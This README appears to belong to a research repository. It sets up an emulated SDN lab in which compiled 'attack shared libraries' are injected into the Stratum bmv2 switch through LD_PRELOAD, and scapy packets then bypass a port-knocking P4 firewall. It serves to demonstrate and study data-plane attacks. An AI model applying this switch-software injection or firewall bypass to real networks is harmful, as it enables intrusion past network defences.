# Installation Instructions

## Download & Run Next-Gen SDN Tutorial VM

1. Download the virtual machine from [http://bit.ly/ngsdn-tutorial-ova](http://bit.ly/ngsdn-tutorial-ova). If this link no longer works, please consult the [Next-Gen SDN Tutorial](https://github.com/opennetworkinglab/ngsdn-tutorial#system-requirements) repository for an updated link or manual installation instructions.
1. Run the VM and log in using the credentials below:
    ```
    username: sdn
    password: rocks 
    ```
    **Note**: The host-only network adapter may need to be disabled for the VM to run successfully.


## Clone This Repository & Set Up Docker Images

1. Replace the ``ngsdn-tutorial`` directory with this repository:
    ```bash
    sudo rm -rf ngsdn-tutorial/
    sudo git clone https://github.com/conorblack/AdvExpP4DP.git
    ```
1. Navigate to the ``AdvExpP4DP`` directory and run the Docker containers to cause them to be downloaded.
    ```bash
    cd AdvExpP4DP/
    sudo make start
    sudo make app-build
    sudo make app-reload
    sudo make netcfg
    ```
1. Check that the Docker containers are running correctly, stop them and navigate back to the home directory.
    ```bash
    make onos-log
    sudo make reset
    cd ..
    ```
    **Note**: The ONOS log output may show some errors initially but should stabilise and show several messages similar to the below:
     ```bash
     INFO [IPv6RoutingComponent] LINK_ADDED event! Configuring device:leaf1...
     ``` 

## Recompile Stratum Executable to Export Symbols

1. Clone the ``Stratum`` directory and start the Docker container.
    ```bash
    sudo git clone https://github.com/stratum/stratum.git
    cd stratum
    sudo git checkout 1bce2a6f8217f9bb80fd75fdf399cd51ecb8241a
    ./setup_dev_env.sh
    ```
1. Recompile the ``stratum_bmv2`` executable to allow our attack shared libraries to load their symbols at runtime.
    ```bash
    bazel build //stratum/hal/bin/bmv2:stratum_bmv2 --compilation_mode=dbg --linkopt="-rdynamic"
    ```
    **Note**: You should exit the Stratum Docker container after this step.
1. Replace the original ``stratum_bmv2`` executable with the recompiled version in the ``mininet`` Docker container's filesystem.
    ```bash
    sudo apt-get update && sudo apt-get install locate
    sudo updatedb
    sudo locate /var/lib/*/stratum_bmv2
    sudo cp [RECOMPILED EXECUTABLE] [OUTPUT OF LOCATE]
    ```
    **Note**: We recommend the use of the ``locate`` command to find the location of the original ``stratum_bmv2`` executable as it is easier than having to track down the correct Docker container ID manually. The location of the ``[RECOMPILED EXECUTABLE]`` can be found in the output of the ``bazel build`` command. If ``locate`` outputs more than one executable, it is safe to replace all of them.

## Download & Install Dependencies of Attack Shared Libraries

1. Download and install ``boost 1.62.0`` into the ``home`` directory to avoid clashes with the ``boost 1.58.0`` already installed on the system.
    ```bash
    sudo wget https://sourceforge.net/projects/boost/files/boost/1.62.0/boost_1_62_0.tar.bz2
    tar --bzip2 -xf boost_1_62_0.tar.bz2
    cd boost_1_62_0/
    ./bootstrap.sh --prefix=/home/sdn/boost/
    ./b2 --prefix=/home/sdn/boost/ install
    cd ..
    ```
1. Download and install ``bmv2`` and its dependencies.
    ```bash
    sudo git clone https://github.com/p4lang/behavioral-model.git bmv2
    sudo apt-get install automake cmake libjudy-dev libgmp-dev libpcap-dev libboost-dev libboost-test-dev libboost-program-options-dev libboost-system-dev libboost-filesystem-dev libboost-thread-dev libevent-dev libtool flex bison pkg-config g++ libssl-dev
    cd bmv2/travis/
    sudo chmod +x install-thrift.sh
    sudo ./install-thrift.sh
    sudo chmod +x install-nanomsg.sh
    sudo ./install-nanomsg.sh
    sudo ./autogen.sh
    sudo ./configure 'CXXFLAGS=-O0 -g'
    sudo make
    sudo make install
    sudo ldconfig
    cd ..
    ```
1. Download and install ``protobuf``.
    ```bash
    sudo git clone https://github.com/google/protobuf.git
    cd protobuf/
    sudo git checkout tags/v3.6.1
    sudo ./autogen.sh
    sudo ./configure
    sudo make 
    sudo make install
    sudo ldconfig
    cd ..
    ```

1. Download and install ``grpc``.
    ```bash
    sudo git clone https://github.com/google/grpc.git
    cd grpc/
    sudo git checkout tags/v1.17.2
    sudo git submodule update --init --recursive
    sudo make
    sudo make install
    sudo ldconfig
    cd ..
    ```

1. Download and install the ``PI`` library.
    ```bash
    sudo git clone https://github.com/p4lang/PI.git
    cd PI/
    sudo ./autogen.sh
    sudo git submodule update --init
    sudo ./configure --with-proto --with-bmv2
    sudo make
    sudo make install
    sudo ldconfig
    cd ..
    ```

     **Note**: All of these dependencies can already be found in the ``mininet`` Docker container's file system and the system cache using the ``locate`` command. These can then be included in the shared libaries and they can be compiled with include directories specified in the compilation command, e.g.:
     ```bash
    sudo g++ program-attack-controller-change.cpp -std=c++11 -shared -o ../mininet/program-attack-controller-change.so -fPIC -ldl -ggdb "/var/lib/docker/overlay2/232a877a3e87d66f37edd586616d4c135dc254a295798c62b19281f25924f0c3/diff/usr/lib/x86_64-linux-gnu/libboost_system.so.1.62.0" -I/home/sdn/.cache/bazel/_bazel_sdn/1b07b1db06ec9ee22c71eac6f0bd4549/external/com_github_p4lang_PI/include -I/home/sdn/.cache/bazel/_bazel_sdn/1b07b1db06ec9ee22c71eac6f0bd4549/external/com_google_protobuf/src/ -I/home/sdn/.cache/bazel/_bazel_sdn/1b07b1db06ec9ee22c71eac6f0bd4549/execroot/com_github_stratum_stratum/bazel-out/k8-dbg/bin/external/com_github_p4lang_p4runtime/ -I/var/lib/docker/overlay2/4840e5716df555fca17c57aa2a2fcf79eaf24a1762aa1fa08db290ee81a84bb2/diff/usr/local/include/ -I/var/lib/docker/overlay2/9c3323067ef2de6bf8c57ff0b9abf24a1ff33bc2f6908c1dd46af6ca9d80add0/diff/usr/include/ -I/var/lib/docker/overlay2/9c3323067ef2de6bf8c57ff0b9abf24a1ff33bc2f6908c1dd46af6ca9d80add0/diff/usr/include/x86_64-linux-gnu/
     ```
     However, we choose to demonstrate how to install the dependencies as this ensures the attack code can remain the same regardless of the Docker container IDs.

## Compile Attack Shared Libraries & Run Docker Containers 

1. Compile chosen shared library.
    ```bash
    cd AdvExpP4DP/attacks
    sudo g++ [ATTACK CODE].cpp -std=c++11 -shared -o ../mininet/[ATTACK LIBRARY].so -fPIC -ldl -ggdb "/home/sdn/boost/lib/libboost_system.so.1.62.0"
    ```
    **Note**: Compiled shared libraries are outputted to the ``mininet`` directory as this is mounted in the ``mininet`` Docker container.
1. Add the following lines under ``mininet`` in ``docker-compose.yml`` to load the compiled shared library.
    ```yaml
    environment:
      - LD_PRELOAD=/mininet/[ATTACK LIBRARY].so
    ```
1. Run Docker containers and view the ``ONOS`` log.
    ```bash
    cd ..
    sudo make reset start
    sudo make app-build
    sudo make app-reload
    sudo make netcfg
    make onos-log
    ```

## Observe Attacks
**For the Program Change Attack**:

1. Open a new terminal window and run ``tcpdump`` on ``h2`` in the ``mininet`` container.
    ```bash
    sudo docker exec -it mininet /bin/bash
    ../mininet/host-cmd h2
    tcpdump tcp
    ```
1. Open a second new terminal window and run ``scapy`` on ``h1c`` in the ``mininet`` container. 
    ```bash
    sudo docker exec -it mininet /bin/bash
    apt-get update && apt-get install scapy python-setuptools
    ../mininet/host-cmd h1c
    scapy
    ```
1. Send attack traffic through ``leaf1`` using ``scapy``, observing in ``tcpdump`` how the attack packets bypass the firewall without following the knock sequence.
    ```python
    sendp(Ether()/IP(src="192.168.1.122", dst="192.168.1.123")/TCP(sport=135,dport=10,chksum=46), iface='h1c-eth0')
    sendp(Ether()/IP(src="192.168.1.122", dst="192.168.1.123")/TCP(sport=135,dport=10,chksum=46), iface='h1c-eth0')
    ```
    **Note**: The ``sendp()`` command must be run twice as the first packet of the flow is sent to the controller to initiate the installation of a P4Knocking ID.

    **Optional**: In order to confirm that the malicious program is not visible to the controller, the `p4rt-sh` program can be used to query the device's config. This will return the legitimate program rather than the malicious program. In order to view this, the following steps can be taken:
    
    1. Locate and open the `p4runtime.py` file.
        ```bash
        sudo locate p4runtime.py
        sudo vi p4runtime.py
        ```
    1. Edit the `get_p4info` function in the following way to view the device config when `p4rt-sh` is run.
        
        **Original**:
        ```python
        @parse_p4runtime_error
        def get_p4info(self):
            logging.debug("Retrieving P4Info file")
            req = p4runtime_pb2.GetForwardingPipelineConfigRequest()
            req.device_id = self.device_id
            req.response_type = p4runtime_pb2.GetForwardingPipelineConfigRequest.P4INFO_AND_COOKIE
            rep = self.stub.GetForwardingPipelineConfig(req)
            return rep.config.p4info
        ```
        **Edited**:
        ```python
        @parse_p4runtime_error
        def get_p4info(self):
            logging.debug("Retrieving P4Info file")
            req = p4runtime_pb2.GetForwardingPipelineConfigRequest()
            req.device_id = self.device_id
            req.response_type = p4runtime_pb2.GetForwardingPipelineConfigRequest.DEVICE_CONFIG_AND_COOKIE
            rep = self.stub.GetForwardingPipelineConfig(req)
            print(rep)
            return rep.config.p4info
        ```

**For the Table Entry Attack**:

1. Open a new terminal window and run ``tcpdump`` on ``h2`` in the ``mininet`` container.
    ```bash
    sudo docker exec -it mininet /bin/bash
    ../mininet/host-cmd h2
    tcpdump tcp
    ```
2. Open a second new terminal window and run ``scapy``. 
     ```bash
    sudo docker exec -it mininet /bin/bash
    apt-get update && apt-get install scapy python-setuptools
    ../mininet/host-cmd h1c
    scapy
    ```
3. Send the following sequence of packets through ``leaf1`` to allow firewall bypass for a source IP address that correctly follows the knock sequence.
    ```python
    sendp(Ether()/IP(src="192.168.1.121", dst="192.168.1.123")/TCP(sport=135,dport=10,chksum=46), iface='h1c-eth0')
    sendp(Ether()/IP(src="192.168.1.121", dst="192.168.1.123")/TCP(sport=135,dport=10,chksum=46), iface='h1c-eth0')
    sendp(Ether()/IP(src="192.168.1.121", dst="192.168.1.123")/TCP(sport=135,dport=20,chksum=46), iface='h1c-eth0')
    sendp(Ether()/IP(src="192.168.1.121", dst="192.168.1.123")/TCP(sport=135,dport=30,chksum=46), iface='h1c-eth0')
    ```
4. Send the following attack packets to demonstrate how the firewall is now bypassed by packets from `192.168.1.122` without the knock sequence being followed.
    ```python
    sendp(Ether()/IP(src="192.168.1.122", dst="192.168.1.123")/TCP(sport=135,dport=30,chksum=46), iface='h1c-eth0')
    sendp(Ether()/IP(src="192.168.1.122", dst="192.168.1.123")/TCP(sport=135,dport=30,chksum=46), iface='h1c-eth0')
    ```
    **Note**: It is crucial to send the packets in the sequence described above. If packets from `192.168.1.122` are sent through `leaf1` before another IP address is granted legitimate firewall access, the attack will fail.

